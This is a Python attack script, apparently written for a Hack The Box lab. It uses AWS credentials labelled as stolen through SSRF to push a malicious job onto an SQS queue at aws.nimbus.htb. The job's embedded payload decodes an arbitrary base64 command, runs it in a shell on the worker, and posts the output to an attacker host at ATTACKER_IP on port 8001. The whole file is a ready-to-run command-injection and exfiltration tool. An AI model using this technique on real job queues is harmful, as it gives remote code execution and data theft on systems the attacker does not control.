#!/usr/bin/env python3
import sys, base64, subprocess

LHOST = "ATTACKER_IP"
TAG = sys.argv[1]
CMD = " ".join(sys.argv[2:])
b64cmd = base64.b64encode(CMD.encode()).decode()

# Python payload the worker will execute (runtime: python3.11). Indented 2 spaces under "script: |".
payload_lines = [
    "import subprocess,base64,urllib.request",
    "c=base64.b64decode('%s').decode()" % b64cmd,
    "p=subprocess.run(c,shell=True,capture_output=True)",
    "d=p.stdout+b'\\n===STDERR===\\n'+p.stderr",
    "urllib.request.urlopen('http://%s:8001/%s',data=d,timeout=10)" % (LHOST, TAG),
]
script_block = "\n".join("  " + l for l in payload_lines)

body = "name: r-%s\nschedule: manual\nruntime: python3.11\nscript: |\n%s\n" % (TAG, script_block)

env = {
    "AWS_ACCESS_KEY_ID": "<ACCESS_KEY_FROM_SSRF>",
    "AWS_SECRET_ACCESS_KEY": "<SECRET_KEY_FROM_SSRF>",
    "AWS_SESSION_TOKEN": "<SESSION_TOKEN_FROM_SSRF>",
    "AWS_DEFAULT_REGION": "us-east-1",
    "PATH": "/usr/local/bin:/usr/bin:/bin",
}
import os
e = dict(os.environ); e.update(env)
cmd = ["aws", "--endpoint-url", "http://aws.nimbus.htb", "sqs", "send-message",
       "--queue-url", "http://aws.nimbus.htb/847219365028/nimbus-jobs",
       "--message-body", body]
r = subprocess.run(cmd, env=e, capture_output=True, text=True)
print("SENT tag=%s cmd=%r" % (TAG, CMD))
print(r.stdout.strip() or r.stderr.strip())
